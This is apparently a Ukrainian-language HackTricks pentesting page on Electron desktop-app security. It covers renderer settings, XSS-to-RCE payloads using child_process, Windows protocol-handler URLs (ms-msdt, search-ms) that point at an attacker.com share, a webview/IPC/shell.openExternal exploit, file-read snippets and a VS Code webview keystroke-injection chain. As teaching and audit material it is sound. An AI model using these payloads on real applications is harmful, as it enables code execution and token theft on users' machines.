# Настільні застосунки Electron

{{#include ../../banners/hacktricks-training.md}}

## Вступ

Electron поєднує привілейований головний процес **Node.js** із процесами рендерингу **Chromium**. Electron — це не веббраузер: код застосунку може навмисно відкривати такі можливості, як доступ до файлової системи та shell, тому для завантаження недовіреного вмісту потрібне суворіше проєктування меж, ніж для звичайного вебсайту.<sup>[[21]](#references)</sup>

Код застосунків Electron зазвичай пакують в архів `.asar`. Розпакуйте його перед аналізом вихідного коду:

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

`package.json` застосунку визначає його головну точку входу. Цей файл зазвичай створює вікна renderer і задає їхні параметри `webPreferences`, що впливають на безпеку.

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron має два основні типи процесів:

- Main Process (має повний доступ до NodeJS)
- Renderer Process (з міркувань безпеки має мати обмежений доступ до NodeJS)

![Electron Desktop Apps — Вступ: Renderer Process (з міркувань безпеки має мати обмежений доступ до NodeJS)](<../../images/image (182).png>)

**Renderer process** — це вікно браузера, яке завантажує файл:<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

**main process** налаштовує кожен renderer process, зазвичай під час створення `BrowserWindow`. Безпечні налаштування зменшують імовірність того, що компрометація renderer process призведе до виконання нативного коду, але самі по собі не роблять ненадійний вміст безпечним.<sup>[[21]](#references)[[22]](#references)</sup>

Перевірте принаймні такі налаштування renderer:<sup>[[22]](#references)</sup>

- **`nodeIntegration`** за замовчуванням має значення `false`. Якщо ввімкнути цю опцію, JavaScript renderer отримає доступ до API Node.js, а також буде вимкнено sandbox цього renderer.
- **`contextIsolation`** за замовчуванням має значення `true`. Ця опція відокремлює контекст JavaScript сторінки від контексту, який використовують preload-скрипти та внутрішні компоненти Electron.
- **`preload`** за замовчуванням не має шляху. Налаштований preload-скрипт запускається до скриптів сторінки та може надавати вузько обмежені API через `contextBridge`.
- **`sandbox`** за замовчуванням має значення `true`, починаючи з Electron 20. Ця опція обмежує доступ renderer до ресурсів операційної системи; встановлення `nodeIntegration: true` вимикає її.
- **`nodeIntegrationInWorker`** за замовчуванням має значення `false` і контролює інтеграцію Node.js у Web Workers.
- **`nodeIntegrationInSubFrames`** за замовчуванням має значення `false`.
  - Якщо **`nodeIntegration`** **ввімкнено**, це дасть змогу використовувати **API Node.js** на вебсторінках, **завантажених в iframe** у застосунку Electron.
  - Якщо **`nodeIntegration`** **вимкнено**, preload-скрипти завантажуватимуться в iframe.

Приклад конфігурації:

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

Деякі **RCE payloads** [тут](https://7as.es/electron/nodeIntegration_rce.txt):<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### Перехоплення трафіку

Змініть конфігурацію start-main і додайте використання проксі, наприклад:

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## Статичне трасування межі ASAR-to-native за допомогою REA

**REA** може читати ASAR або витягнутий каталог застосунку, не виконуючи його JavaScript bootstrap. Граф застосунку фіксує точки входу пакета, bundled modules, налаштування `BrowserWindow` і preload, члени `contextBridge`, реєстрації IPC, запити native add-on і ідентифікатори source map. Це дає відправну точку для трасування можливості, відкритої renderer, до привілейованого обробника main process.<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

Для буквального рядка функції передайте повний запис Evidence як `application` і замініть seed на той, який спостерігався в цільовій системі:<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

Той самий workflow `trace_application_feature` також приймає за початкові дані спостережуваний літеральний член API, IPC-канал або модуль. Перевірте шлях до обробника, кандидатів для валідації та передачу керування нативному коду за вказаними місцями в коді. Виклик renderer `invoke` має відповідати лише одному унікальному кандидату `ipcMain.handle`/`handleOnce` з точно таким самим літеральним каналом; `send` аналогічно має відповідати лише одному унікальному кандидату `ipcMain.on`/`once`/`addListener`. Динамічні або дубльовані обробники залишаються невизначеними. Запитаний член `.node` не є підтвердженим нативним експортом; щоб дійти такого висновку, відповідні дані Hopper/Ghidra мають містити той самий digest артефакту. Статична досяжність також не доводить, що цей шлях було виконано.<sup>[[24]](#references)[[25]](#references)</sup>

Інформацію про межу довіри між renderer і main та валідацію обробників див. у [Electron contextIsolation RCE via IPC](electron-contextisolation-rce-via-ipc.md).

Інформацію про подальший аналіз нативного коду на стороні провайдера див. у [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea).

## Поверхня атаки Electron auto-update

Інформацію про цілісність фіду релізів, rollback, плутанину з підписаними каналами та TOCTOU для staging-файлів див. у [Electron auto-update trust boundaries](electron-auto-update-trust-boundaries.md).

## Локальна ін'єкція коду в Electron

Якщо ви маєте доступ до локального запису або інструментування встановленого застосунку, див. [Electron local code injection and snapshot tampering](electron-local-code-injection-and-snapshot-tampering.md), де описано шляхи через ASAR/main process і V8 snapshot, а також посилання для конкретних ОС.

## RCE: XSS + nodeIntegration

Якщо **nodeIntegration** встановлено в **on**, JavaScript вебсторінки може легко використовувати можливості Node.js, просто викликавши `require()`. Наприклад, у Windows застосунок calc можна запустити так:

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Скрипт, указаний у цьому параметрі, **завантажується до інших скриптів у renderer**, тому має **необмежений доступ до Node APIs**:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

Отже, скрипт може експортувати node-features на сторінки:

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **Якщо `contextIsolation` увімкнено, це не спрацює**

## RCE: XSS + contextIsolation

_**contextIsolation**_ створює **ізольовані контексти для скриптів вебсторінки та внутрішнього JavaScript-коду Electron**, щоб виконання JavaScript у кожному з них не впливало на інший. Це необхідна функція, щоб усунути можливість RCE.

Якщо контексти не ізольовані, зловмисник може:

1. Виконати **довільний JavaScript у renderer** (XSS або перехід на зовнішні сайти)
2. **Перевизначити вбудований метод**, який використовується в preload або внутрішньому коді Electron, власною функцією
3. **Спричинити виклик** **перевизначеної функції**
4. RCE?

Є 2 місця, де можна перевизначити вбудовані методи: у коді preload або у внутрішньому коді Electron:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Обхід обробки кліку

Якщо для кліку на посилання встановлено обмеження, можливо, його вдасться обійти, **натиснувши середню кнопку миші** замість звичайного кліку лівою кнопкою.

```javascript
window.addEventListener('click', (e) => {
```

## RCE через shell.openExternal

Щоб дізнатися більше про ці приклади, перегляньте [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) і [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>

Під час розгортання настільного застосунку Electron важливо правильно налаштувати `nodeIntegration` і `contextIsolation`. Відомо, що за наявності цих налаштувань вони фактично запобігають **віддаленому виконанню коду на стороні клієнта (RCE)**, спрямованому на preload-скрипти або нативний код Electron з основного процесу.

Коли користувач взаємодіє з посиланнями або відкриває нові вікна, спрацьовують певні слухачі подій, важливі для безпеки та функціональності застосунку:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

Ці слухачі **перевизначаються десктопним застосунком**, щоб реалізувати власну **бізнес-логіку**. Застосунок визначає, чи слід відкривати перехід за посиланням усередині застосунку, чи в зовнішньому веббраузері. Зазвичай це рішення приймає функція `openInternally`. Якщо ця функція повертає `false`, це означає, що посилання слід відкрити зовні за допомогою функції `shell.openExternal`.

**Спрощений псевдокод:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Рекомендації з безпеки Electron JS радять не передавати недовірений вміст у функцію `openExternal`, оскільки це може призвести до RCE через різні протоколи. Операційні системи підтримують різні протоколи, які можуть спричинити RCE. Докладні приклади й пояснення цієї теми наведено в [цьому матеріалі](https://positive.security/blog/url-open-rce#windows-10-19042), де є приклади протоколів Windows, за допомогою яких можна експлуатувати цю вразливість.<sup>[[10]](#references)</sup>

У macOS функцію `openExternal` можна використати для виконання довільних команд, наприклад `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Приклади експлуатації протоколів Windows:**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Цю вразливість можна знайти у **[цьому звіті](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.<sup>[[11]](#references)</sup>

**webviewTag** — це **застаріла функція**, яка дозволяє використовувати **NodeJS** у **renderer process**. Її слід вимкнути, оскільки вона дозволяє завантажити скрипт у контекст preload, наприклад:

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

Отже, зловмисник, якому вдалося завантажити довільну сторінку, міг використати цей тег, щоб **завантажити довільний preload script**.

Потім цей preload script використали для виклику **вразливої служби IPC (`skype-new-window`)**, яка викликала **`shell.openExternal`**, щоб отримати RCE:

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## Читання внутрішніх файлів: XSS + contextIsolation

**Вимкнення `contextIsolation` дозволяє використовувати теги `<webview>`**, подібно до `<iframe>`, для читання та exfiltrating локальних файлів. У прикладі показано, як скористатися цією вразливістю, щоб прочитати вміст внутрішніх файлів:<sup>[[2]](#references)</sup>

![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - Читання внутрішніх файлів: XSS + contextIsolation: Вимкнення contextIsolation дозволяє використовувати теги , подібні до , для...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Також описано інший метод **читання внутрішнього файлу**, який демонструє критичну вразливість читання локальних файлів у десктопному застосунку Electron. Він передбачає ін’єкцію скрипту для експлуатації застосунку та exfiltrate даних:

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + старий Chromium**

Якщо версія **Chromium**, що входить до складу програми, стара й має відомі вразливості, можливо, її вдасться експлуатувати й перетворити XSS на RCE.<sup>[[20]](#references)</sup>\
Приклад можна побачити в цьому **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **XSS-фішинг через обхід regex внутрішнього URL**

Якщо ви знайшли XSS, але **не можете викликати RCE або викрасти внутрішні файли**, усе одно можна спробувати **викрасти облікові дані за допомогою фішингу**.<sup>[[1]](#references)</sup>

Спочатку перевірте код frontend, щоб визначити, що відбувається під час відкриття нової URL-адреси:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

Виклик **`openInternally`** визначає, чи відкриється посилання на платформу у **вікні desktop-застосунку**, чи сторонній ресурс відкриється у системному браузері.

Якщо regex allowlist URL функції можна обійти — наприклад, через те, що крапки в імені хоста не були екрановані, — зловмисник може використати XSS, щоб відкрити переконливе вікно запиту облікових даних на інфраструктурі, контрольованій зловмисником:

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## Протокол `file://`

Як зазначено в [посібнику з безпеки Electron](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), сторінки, що працюють через **`file://`**, мають широкий доступ до файлів. Отже, **XSS може дати змогу завантажувати довільні файли** з комп’ютера користувача. Правильно спроєктований **custom protocol** може обмежити доступ до певного набору файлів.<sup>[[21]](#references)</sup>

## Модуль Remote

Модуль Electron Remote дає змогу **renderer-процесам отримувати доступ до API main-процесу**, полегшуючи взаємодію в Electron-застосунку. Однак увімкнення цього модуля створює значні ризики для безпеки. Він розширює поверхню атаки застосунку, роблячи його вразливішим до таких загроз, як міжсайтовий скриптинг (XSS).

> [!TIP]
> Хоча модуль **remote** відкриває renderer-процесам деякі API з main-процесу, просто зловживаючи компонентами, не так легко отримати RCE. Проте компоненти можуть розкривати конфіденційну інформацію.

> [!WARNING]
> Багато застосунків, які досі використовують модуль remote, роблять це так, що **в renderer-процесі потрібно ввімкнути NodeIntegration**, а це **значний ризик для безпеки**.

Вбудований модуль `remote` в Electron було оголошено застарілим, а згодом вилучено; застосунки, яким і досі потрібна його модель, можуть використовувати окремий пакет `@electron/remote`. З огляду на наслідки для безпеки й продуктивності, не відкривайте можливості на кшталт remote для недовірених renderer-процесів.

Для використання `@electron/remote` його спершу потрібно **ініціалізувати в main-процесі**:

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

Після цього процес рендерера може імпортувати об’єкти з модуля:

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

**[допис у блозі](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** описує кілька цікавих **функцій**, доступних через об’єкт **`app`** із remote-модуля:<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - **Перезапускає** застосунок, **завершуючи** роботу поточного екземпляра та **запускаючи** новий. Корисно для **оновлень застосунку** або значних **змін стану**.
- **`app.setAppLogsPath([path])`**  
   - **Визначає** або **створює** каталог для зберігання **журналів застосунку**. Журнали можна **отримати** або **змінити** за допомогою **`app.getPath()`** або **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - **Реєструє** поточний виконуваний файл як **обробник за замовчуванням** для вказаного **протоколу**. За потреби можна вказати **власний шлях** і **аргументи**.
- **`app.setUserTasks(tasks)`**  
   - **Додає** завдання до категорії **Tasks** у **Jump List** (у Windows). Кожне завдання може визначати, як **запускатиметься** застосунок і які **аргументи** буде передано.
- **`app.importCertificate(options, callback)`**  
   - **Імпортує** **сертифікат PKCS#12** до системного **сховища сертифікатів** (лише в Linux). Для обробки результату можна використовувати **callback**.
- **`app.moveToApplicationsFolder([options])`**  
   - **Переміщує** застосунок до папки **Applications** (у macOS). Допомагає забезпечити **стандартне встановлення** для користувачів Mac.
- **`app.setJumpList(categories)`**  
   - **Установлює** або **видаляє** власний **Jump List** у **Windows**. Можна вказати **категорії**, щоб упорядкувати відображення завдань для користувача.
- **`app.setLoginItemSettings(settings)`**  
   - **Налаштовує**, які **виконувані файли** запускатимуться під час **входу в систему**, а також їхні **параметри** (лише в macOS і Windows).

Приклад:

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## Модуль systemPreferences

**Основний API** для доступу до системних налаштувань і **генерування системних подій** в Electron. Методи **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** і **setUserDefault** є **частиною** цього модуля.

**Приклад використання:**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **Прослуховує** **нативні сповіщення macOS** за допомогою NSDistributedNotificationCenter.  
* До **macOS Catalina** можна було перехоплювати **всі** розподілені сповіщення, передавши **nil** у CFNotificationCenterAddObserver.  
* Після **Catalina / Big Sur** програми в sandbox і досі можуть **підписуватися** на **багато подій** (наприклад, **блокування/розблокування екрана**, **монтування томів**, **мережеву активність** тощо), реєструючи сповіщення **за назвою**.

### **getUserDefault / setUserDefault**

* **Взаємодіє** з **NSUserDefaults**, де зберігаються **параметри** програми або глобальні параметри macOS.
    
* **getUserDefault** може **отримувати** конфіденційну інформацію, як-от **розташування нещодавно відкритих файлів** або **географічне розташування користувача**.
    
* **setUserDefault** може **змінювати** ці параметри, потенційно впливаючи на **конфігурацію** програми.
    
* У **старіших версіях Electron** (до v8.3.0) був **доступний** лише **стандартний набір** NSUserDefaults.

## Shell.showItemInFolder

Ця функція показує вказаний файл у файловому менеджері. На вразливих платформах і у вразливих версіях ця взаємодія **могла автоматично виконати файл**.

Докладніше див. [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## Content Security Policy

Програми Electron мають використовувати **Content Security Policy (CSP)** для **запобігання XSS-атакам**. **CSP** — це **стандарт безпеки**, який допомагає **запобігти** **виконанню** **ненадійного коду** в браузері.

Зазвичай її **налаштовують** у файлі **`main.js`** або в шаблоні **`index.html`**, додаючи CSP у **метатег**.

Докладніше див.:


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE: Webview CSP + postMessage trust + local file loading (VS Code 1.63)

Цей реальний ланцюжок експлуатації зачепив Visual Studio Code 1.63 (CVE-2021-43908) і демонструє, як одну XSS-уразливість у webview, спричинену markdown, можна використати для отримання повного RCE, якщо CSP, postMessage і обробники схем налаштовані неправильно. Публічний PoC: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

Огляд ланцюжка атаки
- Перша XSS через CSP webview: Згенерована CSP містила `style-src 'self' 'unsafe-inline'`, що дозволяло ін’єкцію на основі inline-стилів у контексті `vscode-webview://`. Payload надсилав beacon-запит на `/stealID`, щоб викрасти extensionId цільового webview.
- Формування URL цільового webview: використання leaked ID для створення `vscode-webview://<extensionId>/.../<publicUrl>`.
- Друга XSS через довіру до postMessage: зовнішній webview довіряв `window.postMessage` без суворої перевірки origin/type та завантажував HTML зловмисника з увімкненим `allowScripts: true`.
- Завантаження локального файла через переписування схеми/шляху: payload переписував `file:///...` на `vscode-file://vscode-app/...` і підміняв `exploit.md` на `RCE.html`, використовуючи слабку перевірку шляху для завантаження привілейованого локального ресурсу.
- RCE у контексті з доступом до Node: завантажений HTML виконувався з доступом до Node API, що давало змогу виконувати команди ОС.

Приклад примітиву RCE у фінальному контексті
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

Додаткове читання про проблеми довіри до postMessage:

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev: синтетичні комбінації клавіш webview + декларативні мости команд розширень

У червні 2026 року з’явився новий клас способів виходу з webview у VS Code: **недовірений JavaScript у webview блокнота/попереднього перегляду міг імітувати глобальні привілейовані комбінації клавіш**, оскільки preload webview передавав дані `keydown` до host workbench, а host обробляв їх як справжнє введення користувача.<sup>[[14]](#references)</sup>

Це частина ширшої історії атак на межі довіри IDE, під час яких контрольований проєктом вміст отримує доступ до привілейованих функцій редактора.<sup>[[19]](#references)</sup>

### Порушення межі довіри

Якщо webview із sandbox або з іншого origin копіює контрольовані зловмисником поля клавіатурної події (`key`, `code`, `keyCode`, модифікатори, `repeat`) у привілейований міст `postMessage`/message-port **без перевірки `event.isTrusted`**, JavaScript усередині webview може виконувати комбінації клавіш workbench за допомогою:<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

Це особливо корисно, коли браузер **блокує синтетичне введення**. Скриптові клавіатурні події зазвичай **не можуть вводити довільний текст в HTML-елементи `<input>`**, але все одно запускають комбінації клавіш, які безпосередньо обробляють `keydown`.

### Практичні сценарії зловживання

- **Зловживання інтерфейсом через комбінації клавіш:** цільтеся в глобальні прив’язки клавіш, як-от підтвердження сповіщень, навігація палітрою команд, активація сфокусованої кнопки або переміщення меню, замість того щоб намагатися вводити команди.
- **Передбачувані привілейовані запити на основі метаданих робочого простору:** контрольований репозиторієм файл `.vscode/extensions.json` може рекомендувати розширення зловмисника та створювати передбачуване сповіщення про встановлення, яке можна підтвердити комбінацією клавіш, як-от `Ctrl+Shift+A`.
- **Декларативний маніфест розширення як міст до команд:** навіть якщо CSP блокує код розширень локального робочого простору у вебверсії VS Code, декларативні внески `package.json` усе ще можуть завантажуватися. Локальне розширення в `.vscode/extensions` може зареєструвати прив’язку клавіш, яка викликає `runCommands`, а потім привілейовану внутрішню команду, як-от `workbench.extensions.installExtension`.<sup>[[14]](#references)[[18]](#references)</sup>

Приклад шаблону маніфесту:

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **Приховані security flags, доступні через недовірені метадані:** якщо внутрішня команда приймає контрольовані зловмисником аргументи на кшталт `{"context":{"skipPublisherTrust":true}}`, декларативні метадані можуть приховати діалог довіри та встановити розширення з Marketplace/CDN, яке зрештою виконає код зловмисника.
- **Зловживання довіреними Workspace:** якщо віддаленим/web workspaces автоматично довіряють, локальні розширення workspace стають цінним мостом від вмісту репозиторію до привілейованих дій редактора.
- **Розширення обсягу доступу після компрометації:** після виконання розширення перевірте, які токени редактор надає розширенням. У `github.dev` викрадений GitHub token був дійсним не лише для відкритого репозиторію, тож запит до `https://api.github.com/user/repos` перелічив інші доступні приватні репозиторії.

### Нотатки аудиту

- Розглядайте **пересилання введення з webview до host** як межу привілеїв; ніколи не передавайте повторно синтетичні події клавіш/кліків із недовірених фреймів до host.
- Перевіряйте авторизацію **всередині** чутливих команд. Не приймайте наданий викликачем контекст команди, який може встановлювати внутрішні прапорці, як-от `skipPublisherTrust`.
- Не вважайте, що блокування виконуваного локального коду розширень достатньо; також перевіряйте **декларативні внески** (`keybindings`, `menus`, `commands`, tasks) у маніфестах, якими керує workspace.
- Виправлення від 3 червня 2026 року додали `isTrusted` до пересланих подій, вимкнули пересилання недовірених клавіш у notebook webviews і припинили приймати контекст команди встановлення, наданий викликачем.<sup>[[16]](#references)[[17]](#references)</sup>

## **Інструменти**

Добірка **awesome-electronjs-hacking** містить додаткові матеріали досліджень, інструменти та ресурси з вразливими застосунками.<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity) — інструмент для виявлення неправильних конфігурацій і антишаблонів безпеки в застосунках на базі Electron.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) — open source плагін VS Code для застосунків Electron, що використовує Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) перевіряє на наявність вразливих сторонніх бібліотек.
- [**Electro.ng**](https://electro.ng/) — комерційний інструмент аналізу безпеки Electron.

## Лабораторні роботи

На [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) можна знайти лабораторну роботу з експлуатації вразливих застосунків Electron.<sup>[[4]](#references)</sup>

Ці команди допоможуть вам пройти лабораторну роботу:

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

Раніше опублікована адреса для наявних закладок: [Настільні застосунки Electron](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Маршрут усієї сторінки перенаправляє сюди; історичний фрагмент не підтримується.

## References

- [1] [Phishing і викрадення облікових даних у застосунках Electron](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Читання довільних файлів у настільному застосунку Facebook Messenger](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron: зловживання відсутністю ізоляції контексту - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [Майстер-клас із злому сучасних настільних застосунків за допомогою XSS і RCE](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - добірка ресурсів про (не)безпеку Electron.js](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Неправильне використання API Electron: перший вибір зловмисника](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Payload-и RCE для Electron nodeIntegration](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [RCE в один клік у застосунках Electron](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Небезпека shell.openExternal() в Electron - багато шляхів до віддаленого виконання коду](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [Дозвольте довільні URL-адреси — очікуйте довільного виконання коду](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [Як отримати RCE у популярному японському чат-застосунку за допомогою застарілої функції Electron](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Настільний Discord - віддалене виконання коду](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - віддалене виконання коду в обмеженому режимі (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [Викрадення токена GitHub в один клік через ін'єкцію подій клавіатури у Webview VS Code](https://blog.ammaraskar.com/github-token-stealing)
- [15] [Проблема VS Code #319593: Webview можуть викликати довільні комбінації клавіш в основному робочому середовищі](https://github.com/microsoft/vscode/issues/319593)
- [16] [PR VS Code #319705: підтвердження відкриття ноутбука й припинення приймання наданого викликачем контексту installExtension](https://github.com/microsoft/vscode/pull/319705)
- [17] [PR VS Code #319813: блокування програмного повторного надсилання натискань клавіш/кліків із Webview ноутбуків](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / розширення локального робочого простору](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
